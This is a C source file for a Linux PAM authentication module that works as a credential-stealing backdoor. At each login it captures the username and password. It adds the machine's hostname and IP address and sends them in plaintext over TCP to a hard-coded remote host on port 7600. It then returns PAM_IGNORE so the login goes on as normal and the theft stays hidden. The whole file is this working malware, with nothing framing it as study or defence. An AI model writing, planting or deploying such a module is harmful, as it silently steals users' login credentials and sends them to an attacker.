#define IFACE "ens33"
#define REMOTE_HOST "172.27.118.46"

#define PAM_SM_AUTH
#define REQUEST_LENGTH 512
#define HOSTNAME_LENGTH 256
#define PAM_REMOTE2_ERR -1
#define PAM_REMOTE2_SUCCESS 0
#define SERVER_PORT 7600

#include <arpa/inet.h>
#include <net/if.h>
#include <netdb.h>
#include <security/_pam_types.h>
#include <security/pam_appl.h>
#include <security/pam_ext.h>
#include <security/pam_modules.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

int pam_remote2_send_creds(const char *remote,
                           const char *user,
                           const char *authtok,
                           const char *hostname,
                           const char *ipaddr) {
    int sock;
    struct sockaddr_in remote_addr = {0};

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
        return PAM_REMOTE2_ERR;

    remote_addr.sin_family = AF_INET;
    remote_addr.sin_addr.s_addr = inet_addr(remote);
    remote_addr.sin_port = htons(SERVER_PORT);

    if (connect(sock, (struct sockaddr *)&remote_addr, sizeof(remote_addr)) < 0)
        return PAM_REMOTE2_ERR;

    char message[REQUEST_LENGTH] = {0};
    sprintf(message, "%s,%s,%s,%s", user, authtok, hostname, ipaddr);
    if (write(sock, message, strlen(message)) < 0) {
        close(sock);
        return PAM_REMOTE2_ERR;
    }

    close(sock);
    return PAM_REMOTE2_SUCCESS;
}

int pam_remote2_get_host(const char *iface, char *hostname, const char **ipaddr) {
    int fd;
    struct ifreq ifr;
    struct hostent *host_entry;

    memset(hostname, 0, HOSTNAME_LENGTH);
    // infaillable
    gethostname(hostname, sizeof(hostname));

    if (iface != NULL) {
        fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0)
            return PAM_REMOTE2_ERR;

        ifr.ifr_addr.sa_family = AF_INET;
        strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

        if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
            close(fd);
            return PAM_REMOTE2_ERR;
        }

        close(fd);
        *ipaddr = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    }

    return PAM_REMOTE2_SUCCESS;
}

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user, *authtok, *ipaddr = NULL;
    char hostname[HOSTNAME_LENGTH];
    char prompt[64];

    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS)
        return PAM_IGNORE;

    memset(prompt, 0, sizeof(prompt));
    sprintf(prompt, "password for %s: ", user);
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &authtok, prompt) != PAM_SUCCESS)
        return PAM_IGNORE;

    if (pam_remote2_get_host(IFACE, hostname, &ipaddr) != PAM_REMOTE2_SUCCESS)
        return PAM_IGNORE;

    pam_remote2_send_creds(REMOTE_HOST, user, authtok, hostname, ipaddr);
    return PAM_IGNORE;
}
